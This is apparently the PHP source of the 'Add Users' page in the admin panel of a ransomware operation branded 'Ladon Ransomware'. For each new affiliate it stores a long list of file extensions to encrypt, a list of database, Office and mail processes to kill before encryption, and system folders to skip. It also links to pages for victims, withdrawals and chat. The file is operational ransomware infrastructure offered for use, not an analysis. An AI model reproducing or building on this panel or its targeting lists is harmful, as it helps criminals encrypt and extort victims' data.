<?php
include_once("config.php");

if($session != hash('sha256', "admin")){ 
    header("Location:https://pornhub.com");
    die();
}
else if($session == hash('sha256',"admin")){
    if(!empty($_POST['username']) && !empty($_POST['password'])){
        $username = $_POST["username"];
        $userhash = hash('sha256', $username);
        $password = $_POST["password"];
        $passhash = hash('sha256',$password);
        $add = "INSERT INTO `users` (`username`, `password`) VALUES (:username, :password)";
        if($sth  = $db->prepare($add)){
            $sth->bindParam(":username", $userhash);
            $sth->bindParam(":password", $passhash);
            $sth->execute();
            $ezt = "INSERT INTO `extensions` (`username`, `active`, `extension`) VALUES (:username, '1', :extension)";
    

    $extensions = array('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der');
        foreach ($extensions as &$value) {
        if($sth = $db->prepare($ezt)){
            $sth->bindParam(":username", $userhash);
            $sth->bindParam(":extension", $value);
            $sth->execute();
        }
        }
        


            $ezt = "INSERT INTO `debug` (`username`, `debug`) VALUES (:username, :debug)";
    

    $debugs = array("sqlservr.exe", "msftesql.exe", "sqlagent.exe", "sqlbrowser.exe", "sqlwriter.exe", "oracle.exe", "ocssd.exe", "dbsnmp.exe", "synctime.exe", "mydesktopqos.exe", "agntsvc.exeisqlpplussvc.exe", "isqlpussvc.exe", "wordpad.exe", "winword.exe", "visio.exe", "Thunderbird.exe", "thebat64.exe", "stream.exe", "powerpnt.exe", "outlook.exe", "onenote.exe", "mspub.exe", "msaccess.exe", "infopath.exe", "excel.exe", "sqbcoreservice.exe", "dbeng50.exe", "mysqld-opt.exe", "mysqld-nt.exe", "mysqld.exe", "ocomm.exe", "tbirdconfig.exe", "firefoxconfig.exe", "encsvc.exe", "ocautoupds.exe", "mydesktopservice.exe", "xfssvccon.exe");
     	   foreach ($debugs as &$debug) {
    	    if($sth = $db->prepare($ezt)){
      		      $sth->bindParam(":username", $userhash);
      		      $sth->bindParam(":debug", $debug);
      		      $sth->execute();
       		}
            }

        $blacks = "INSERT INTO `blacklist` (`username`, `directory`) VALUES (:username, :directory)";
        $blacklists = array("Windows", "Program Files", "Boot", "Program Files (x86)");
        foreach ($blacklists as &$blacklist) {
        if($sth = $db->prepare($blacks)){
            $sth->bindParam(":username", $userhash);
            $sth->bindParam(":directory", $blacklist);
            $sth->execute();
        }
        }







        }

    }
    else if(!empty($_GET['remove'])){

          	$userz = $_GET['remove'];
		$checkuser = "SELECT * FROM `users` WHERE `id` = :id";
		$useraddr = "";
		if($sth = $db->prepare($checkuser)){
			$useraddr = "";
			$sth->bindParam(":id", $userz);
			$sth->execute();
			if($sth->rowCount() > 0){
			while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
			$useraddr = $row["username"];	
			}

            $rmz = "DELETE FROM `users` WHERE `id` = :id";
            if($sth = $db->prepare($rmz)){
                $sth->bindParam(":id", $userz);
                $sth->execute();
            }
            $rg = "DELETE FROM `extensions` WHERE `username` = :username";
            if($sth = $db->prepare($rg)){
                $sth->bindParam(":username", $useraddr);
                $sth->execute();
            }
            $rgo = "DELETE FROM `debug` WHERE `username` = :username";
            if($sth = $db->prepare($rgo)){
                $sth->bindParam(":username", $useraddr);
                $sth->execute();
            }

            $ra = "DELETE FROM `ransomware` WHERE `username` = :username";
            if($sth = $db->prepare($ra)){
                $sth->bindParam(":username", $useraddr);
                $sth->execute();
            }
            $bl = "DELETE FROM `blacklist` WHERE `username` = :username";
            if($sth = $db->prepare($bl)){
                $sth->bindParam(":username", $useraddr);
                $sth->execute();
            }
            $ch = "DELETE FROM `chat` WHERE `username` = :username";
            if($sth = $db->prepare($ch)){
                $sth->bindParam(":username", $useraddr);
                $sth->execute();
            }

        }
}}
}
else{
    header("Location:https://pornhub.com");
    die();
}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        <meta name="description" content="">
        <meta name="keyword" content="">

        <title>Ladon Ransomware</title>

        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/slidebars.min.css" rel="stylesheet">
        <link href="assets/css/icons.css" rel="stylesheet">
        <link href="assets/css/menu.css" rel="stylesheet" type="text/css">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>

    <body class="sticky-header">
        <section>
            <!-- sidebar left start-->
            <div class="sidebar-left">
                <div class="sidebar-left-info">
  
                                        
                    <!--sidebar nav start-->
                    <ul class="side-navigation">
                        <li class="active">
                            <a href="index.php"><span>Dashboard</span></a>
                        </li>
                       
                       
                        <li class="active"><a href="data.php"> <span>Victims</span></a>
                        </li>
                        <li class="active"><a href="withdraw.php"> <span>Withdrawl</span></a>
                        </li>
                        
                        <li class="active"><a href="extensions.php"> <span>Extensions</span></a>
                        </li>

			<li class="active"><a href="pass.php"> <span>Change Password</span></a>
                        </li>
                        <?php

                         if($session == md5("admin"))
                        { ?>
                        <li class="active"><a href="users.php"> <span>Add Users</span></a>
                        </li>
                        <?php
                        }
                            ?>

                        <li class="active"><a href="logout.php"> <span>LogOut</span></a>
                        </li>
                    </ul><!--sidebar nav end-->
                </div>
            </div><!-- sidebar left end-->

            <!-- body content start-->
            <div class="body-content">
                <!-- header section start-->
                <div class="header-section">
                    <!--logo and logo icon start-->
                    <div class="logo">
                        <a href="index.php">
                            <!--<i class="fa fa-maxcdn"></i>-->
                            <span class="brand-name">LADON RANSOMWARE</span>
                        </a>
                    </div>

                    <!--toggle button start-->
                    <a class="toggle-btn"><i class="ti ti-menu"></i></a>
                    <!--toggle button end-->

                  

                </div>
                <!-- header section end-->

                <div class="container-fluid">
                    <div class="page-head">
                        <h4 class="mt-2 mb-2">Add User</h4>
                    </div>



                    <div class="row">
                        <div class="col-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Add User</h5>              
                                    <div class="general-label">
                                        <form class="form-inline" role="form" method="POST">
                                            <div class="form-group">
                                                <label class="sr-only" for="username">Username</label>
                                                <input class="form-control ml-2" id="username" name="username" placeholder="username">
                                            </div>
                                              
                                            <div class="form-group m-l-10">
                                                <label class="sr-only" for="password">Password</label>
                                                <input type="password" class="form-control ml-2" id="password" name="password" placeholder="Password">
                                            </div>
                                            <button type="submit" class="btn btn-success ml-2">Add User!</button>
                                        </form>       
                                    </div>                            
                                </div>
                            </div>
                        </div>
                    </div><!--end row-->



                    <div class="row">
                        <div class="col-lg-12 col-sm-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Users</h5>           
                                    <div class="row">
                                        <div class="col-sm-12">
                                            <div class="table-responsive">
                                                <table class="table table-hover m-b-0">
                                                    <thead>
                                                        <tr>
                                                            <th>ID</th>
                                                            <th>Username</th>
                                                            <th>Options</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody>
                                                        <?php
                                                        $table = "SELECT * FROM `users` ";
                                                        if($sth = $db->prepare($table)){
                                                            $sth->execute();
                                                            if($sth->rowCount() > 0 ){
                                                            
                                                            while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
                                                                echo"<tr><td>".$row["id"]."</td><td>".htmlentities($row["username"], ENT_QUOTES)."</td><td>
                                            <a href='users.php?remove=".$row["id"]."' type='submit' class='btn btn-primary'>Remove User </a></td></tr>";
                                                            }
                                                            }

                                                        }
                                                        ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>              
                                </div>
                            </div>
                        </div>
                    </div> 
                          
                    
                </div><!--end container-->

                <!--footer section start-->
                <footer class="footer">
                    LANDON RANSOMWARE
                </footer>
                <!--footer section end-->



            </div>
            <!--end body content-->
        </section>

        <script src="assets/js/jquery-3.2.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery-migrate.js"></script>
        <script src="assets/js/jquery.slimscroll.min.js"></script>

    </body>
</html>



